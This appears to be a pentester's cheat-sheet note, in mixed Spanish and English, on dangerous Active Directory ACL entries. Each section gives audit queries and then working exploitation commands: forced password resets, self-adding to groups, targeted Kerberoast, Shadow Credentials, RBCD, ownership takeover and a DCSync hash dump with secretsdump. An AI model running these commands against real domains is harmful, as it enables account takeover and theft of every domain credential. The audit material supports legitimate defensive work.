---
aliases:
  - GenericAll
  - WriteDACL
  - ForceChangePassword
  - DCSync ACE
tags:
  - type/concept
  - vuln/ad-enumeration
  - technique/discovery
  - asset/active-directory
primary categories: null
secondary categories: null
tertiary categories: null
type: SubCheatSheet
linked:
  - '[[AD - ACL Enumeration]]'
---
# AD - ACL Enumeration - Dangerous ACE Patterns

***

## GenericAll (Full Control)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `Get-Acl "AD:<DN>" \| ? Access -match "GenericAll"` | ACEs con FullControl | Audit. |
| `Find-InterestingDomainAcl -ResolveGUIDs \| ? ActiveDirectoryRights -match "GenericAll"` | Bulk hunt | Forest-wide. |
| BloodHound `MATCH (u)-[:GenericAll]->(t) WHERE u.domain = t.domain RETURN u.name,t.name` | Visual GenericAll | Graph. |
^ad-ace-genericall

**Lo que permite:** todo. Para users → reset pwd, modify SPN, set KeyCred, agregar a groups. Para groups → add members. Para computers → RBCD configure. Para OUs → modificar todos los descendientes.

```bash
# Exploit user GenericAll → reset password
net user <victim> <NewPass!> /domain
# o
Set-ADAccountPassword -Identity <victim> -Reset -NewPassword (ConvertTo-SecureString "<NewPass!>" -AsPlainText -Force)

# Linux
bloodyAD --host <DC> -d corp -u atacante -p pass set password <victim> '<NewPass!>'

# Group GenericAll → add self
Add-ADGroupMember <group> -Members <atacante>
# o
bloodyAD --host <DC> -d corp -u atacante -p pass add groupMember <group> <atacante>
```

___

## GenericWrite

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `Get-Acl "AD:<DN>" \| ? Access -match "GenericWrite"` | ACEs GenericWrite | Audit. |
| BloodHound `MATCH (u)-[:GenericWrite]->(t) RETURN u,t` | Visual | Graph. |
^ad-ace-genericwrite

**Lo que permite:** modify cualquier attribute (no DACL/Owner). Para users → set SPN (Targeted Kerberoast), set KeyCred (Shadow Cred), set `userAccountControl` (DONT_REQ_PREAUTH = AS-REP roastable). Para computers → set `msDS-AllowedToActOnBehalfOfOtherIdentity` (RBCD).

```powershell
# Targeted Kerberoast (set SPN)
Set-ADUser <victim> -ServicePrincipalNames @{Add="HTTP/fake.corp.local"}

# Targeted AS-REP (force DONT_REQ_PREAUTH)
Set-ADAccountControl -Identity <victim> -DoesNotRequirePreAuth $true

# Shadow Credentials
certipy shadow auto -u atacante -p pass -account <victim> -dc-ip <DC>

# RBCD computer
Set-ADComputer <target-computer> -PrincipalsAllowedToDelegateToAccount <atacante-computer>
```

___

## WriteDACL

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `Get-Acl "AD:<DN>" \| ? Access -match "WriteDacl"` | ACEs WriteDACL | Audit critical. |
| BloodHound `MATCH (u)-[:WriteDacl]->(t) RETURN u,t` | Visual | Graph. |
^ad-ace-writedacl

**Lo que permite:** modificar el DACL del objeto = grant self GenericAll = full control efectivo. 2-step privesc.

```powershell
# Step 1: Grant self GenericAll
$acl = Get-Acl "AD:<victim-DN>"
$ace = New-Object DirectoryServices.ActiveDirectoryAccessRule(
  (New-Object System.Security.Principal.NTAccount("corp\atacante")),
  [DirectoryServices.ActiveDirectoryRights]::GenericAll,
  [Security.AccessControl.AccessControlType]::Allow
)
$acl.AddAccessRule($ace)
Set-Acl "AD:<victim-DN>" $acl

# Step 2: Use GenericAll
Set-ADAccountPassword -Identity <victim> -Reset -NewPassword ...
```

```bash
# Linux equivalent
bloodyAD --host <DC> -d corp -u atacante -p pass add genericAll <victim> atacante
```

___

## WriteOwner

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `Get-Acl "AD:<DN>" \| ? Access -match "WriteOwner"` | ACEs WriteOwner | Audit. |
| `Get-ADObject <DN> -Pr nTSecurityDescriptor \| % {$_.nTSecurityDescriptor.Owner}` | Owner actual | Pre-takeover. |
| BloodHound `MATCH (u)-[:WriteOwner]->(t) RETURN u,t` | Visual | Graph. |
^ad-ace-writeowner

**Lo que permite:** take ownership → owner tiene Modify Permissions implícito → grant self GenericAll. 3-step privesc.

```powershell
# Step 1: Take ownership
$obj = [ADSI]"LDAP://<victim-DN>"
$acl = $obj.psbase.ObjectSecurity
$acl.SetOwner([System.Security.Principal.NTAccount]"corp\atacante")
$obj.psbase.CommitChanges()

# Step 2: Grant self GenericAll (now owner)
# (igual que WriteDACL workflow)
```

```bash
# Linux
bloodyAD --host <DC> -d corp -u atacante -p pass set owner <victim> atacante
bloodyAD --host <DC> -d corp -u atacante -p pass add genericAll <victim> atacante
```

___

## ForceChangePassword

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `Get-Acl "AD:<DN>" \| ? {$_.Access -match "ExtendedRight" -and $_.ObjectType -eq "00299570-246d-11d0-a768-00aa006e0529"}` | ACEs ForceChangePassword (User-Force-Change-Password GUID) | Audit. |
| BloodHound `MATCH (u)-[:ForceChangePassword]->(t) RETURN u,t` | Visual | Graph. |
^ad-ace-forcechange

**Lo que permite:** reset password sin saber actual. Common privesc — reset victim → login as victim.

```powershell
# Reset victim pwd
Set-ADAccountPassword -Identity <victim> -Reset \
  -NewPassword (ConvertTo-SecureString '<NewPass!>' -AsPlainText -Force)

# Login + use
runas /netonly /user:corp\<victim> cmd
```

```bash
# Linux
bloodyAD --host <DC> -d corp -u atacante -p pass set password <victim> '<NewPass!>'

# Or net rpc (samba)
net rpc password '<victim>' '<NewPass!>' -U 'corp/atacante%pass' -S <DC>
```

___

## AddSelf / AddMember

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `Get-Acl "AD:<group-DN>" \| ? {$_.Access -match "WriteProperty" -and $_.ObjectType -eq "bf9679c0-0de6-11d0-a285-00aa003049e2"}` | ACEs WriteProperty `member` (AddMember) | Audit. |
| BloodHound `MATCH (u)-[:AddMember\|AddSelf]->(g:Group) RETURN u,g` | Visual | Graph. |
^ad-ace-addself

**Lo que permite:** agregar member al group sin GenericWrite/All. Específico al attribute `member`. Common ACE delegada.

```powershell
Add-ADGroupMember <group> -Members <atacante>
```

```bash
bloodyAD --host <DC> -d corp -u atacante -p pass add groupMember <group> <atacante>
net rpc group addmem '<group>' '<atacante>' -U 'corp/atacante%pass' -S <DC>
```

___

## WriteProperty (Specific Attrs)

| **GUID Attr** | **Attribute** | **Abuse** |
|:---:|:---:|:---:|
| `bf9679c0-0de6-11d0-a285-00aa003049e2` | `member` | Add member to group. |
| `f3a64788-5306-11d1-a9c5-0000f80367c1` | `servicePrincipalName` | Targeted Kerberoast. |
| `5b47d60f-6090-40b2-9f37-2a4de88f3063` | `msDS-KeyCredentialLink` | Shadow Credentials. |
| `bf967a00-0de6-11d0-a285-00aa003049e2` | `userAccountControl` | Force AS-REP roast / disable account. |
| `bf967950-0de6-11d0-a285-00aa003049e2` | `description` | Cred plant. |
| `3f78c3e5-f79a-46bd-a0b8-9d18116ddc79` | `msDS-AllowedToActOnBehalfOfOtherIdentity` | RBCD. |
| `4828cc14-1437-45bc-9b07-ad6f015e5f28` | `gPLink` (OU) | Link malicious GPO. |
^ad-ace-writeprop

```powershell
# Hunt WriteProperty con GUID específico (e.g. msDS-KeyCredentialLink)
Get-Acl "AD:<victim-DN>" |
  Select -Expand Access |
  Where {
    $_.ObjectType -eq "5b47d60f-6090-40b2-9f37-2a4de88f3063" -and
    $_.ActiveDirectoryRights -match "WriteProperty"
  }
```

___

## DCSync Rights

| **GUID** | **Right** | **Combo** |
|:---:|:---:|:---:|
| `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` | `DS-Replication-Get-Changes` | DCSync (parcial). |
| `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2` | `DS-Replication-Get-Changes-All` | DCSync (full, incluye creds). |
| `89e95b76-444d-4c62-991a-0facbeda640c` | `DS-Replication-Get-Changes-In-Filtered-Set` | RODC scope. |
^ad-ace-dcsync

**Combo crítico:** `GetChanges` + `GetChangesAll` sobre domain root = full DCSync (extracción krbtgt + todos los hashes).

```powershell
# Hunt DCSync rights
Get-Acl "AD:DC=corp,DC=local" |
  Select -Expand Access |
  Where {
    $_.ObjectType -in @(
      "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2",
      "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2"
    )
  } |
  Select IdentityReference,ActiveDirectoryRights,ObjectType
```

```bash
# BloodHound Cypher
# MATCH (u)-[:GetChanges|GetChangesAll]->(d:Domain) RETURN u.name,d.name

# Exploit
secretsdump.py corp.local/atacante:pass@<DC> -just-dc
```

___

## Other Dangerous ACEs

| **Right** | **Abuse** | **Cuándo** |
|:---:|:---:|:---:|
| `AllExtendedRights` | Includes ForceChangePassword + DCSync rights + LAPS read | Critical. |
| `WriteSPN` (specific WriteProperty) | Targeted Kerberoast | Standard. |
| `Self-Membership` (`bf9679c0-...`) | Self-add to group | AddSelf variant. |
| `Migrate-SID-History` extended right | Cross-trust SID History inject | Edge — forest takeover. |
| `Reanimate-Tombstones` extended right | Restore deleted objects | Edge persistence. |
| `Recalculate-Hierarchy` | Edge | Rare. |
^ad-ace-other

___

## ACE Inheritance

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `(Get-Acl "AD:<DN>").Access \| ? IsInherited -eq $true` | ACEs heredadas (no directas en el object) | Tracing. |
| `(Get-Acl "AD:<DN>").Access \| ? IsInherited -eq $false` | ACEs directas | Direct config. |
| `(Get-Acl "AD:<DN>").AreAccessRulesProtected` | True = blocking inheritance | Audit. |
^ad-ace-inheritance

**Por qué importa:** ACE en OU padre puede afectar todos los descendientes vía inheritance. Audit OU root + AdminSDHolder + Tier 0 OUs primero.

***
